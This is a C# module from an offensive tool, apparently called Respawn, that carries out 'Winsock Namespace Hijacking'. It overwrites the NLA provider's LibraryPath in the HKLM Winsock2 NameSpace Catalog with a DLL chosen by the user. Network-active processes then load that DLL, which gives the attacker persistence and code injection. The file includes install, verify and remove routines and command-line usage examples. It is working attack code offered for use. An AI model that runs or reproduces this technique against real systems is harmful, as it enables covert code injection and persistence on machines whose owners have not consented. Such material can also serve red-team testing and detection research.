using Microsoft.Win32;
using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;
using System;
using System.Collections.Generic;

namespace Respawn.Techniques.Winsock
{
    public class WinsockModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "winsock";
        public string Name        => "Winsock Namespace Hijacking";
        public string Mitre       => "";
        public string Description => "Abuse the Winsock2 NameSpace Catalog to achieve DLL injection into network-active processes by hijacking the NLAapi.dll provider.";

        // ─── Constants ───────────────────────────────────────────────────────────

        const string EntryPath = @"SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000005";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p1", "keys");

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Full path to the DLL to be injected");
            Console.WriteLine();

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();
            TechniqueHelpBuilder.RenderExample("Respawn -t winsock -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t winsock -a install -p \"C:\\p.dll\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t winsock -a verify");
            TechniqueHelpBuilder.RenderExample("Respawn -t winsock -a remove");
        }

        public List<TechniqueOption> ListOptions(string type)
        {
            if (type.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return WinsockKeys.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, true, out string error)) return TechniqueResult.Fail(error);

            try
            {
                using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(EntryPath, true);
                if (key == null) return TechniqueResult.Fail("Target Winsock catalog entry (NLA) not found.");

                string? current = key.GetValue("LibraryPath")?.ToString();
                if (current != null && current.Equals(ctx.Payload, StringComparison.OrdinalIgnoreCase))
                    return TechniqueResult.Exists("Payload is already registered as the NLA provider.");

                // Backup original NLAapi.dll path
                if (current != null && !current.Contains(ctx.Payload))
                    key.SetValue("RESPAWN_BACKUP", current);

                key.SetValue("LibraryPath", ctx.Payload);
                
                return TechniqueResult.Ok($"Winsock hijack successful. Targeted NLA provider (hklm-winsock) with: {ctx.Payload}");
            }
            catch (UnauthorizedAccessException) { return TechniqueResult.Denied("Administrator privileges required for HKLM Winsock modification."); }
            catch (Exception ex) { return TechniqueResult.Fail(ex.Message); }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            try
            {
                using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(EntryPath, true);
                if (key == null) return TechniqueResult.NotFound("Winsock entry not found.");

                string? backup = key.GetValue("RESPAWN_BACKUP")?.ToString();
                if (!string.IsNullOrEmpty(backup))
                {
                    key.SetValue("LibraryPath", backup);
                    key.DeleteValue("RESPAWN_BACKUP", false);
                    return TechniqueResult.Ok("Restored original NLA provider path.");
                }

                return TechniqueResult.NotFound("No backup found to restore.");
            }
            catch (Exception ex) { return TechniqueResult.Fail(ex.Message); }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            try
            {
                using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(EntryPath);
                var current = key?.GetValue("LibraryPath");
                return current != null ? TechniqueResult.Ok($"Current Provider Path: {current}") : TechniqueResult.NotFound("Key missing.");
            }
            catch (Exception ex) { return TechniqueResult.Fail(ex.Message); }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            error = string.Empty;
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload)) { error = "Missing payload (-p)"; return false; }
            if (requirePayload && !System.IO.File.Exists(ctx.Payload)) { error = "Specified DLL payload not found on disk."; return false; }
            return true;
        }
    }
}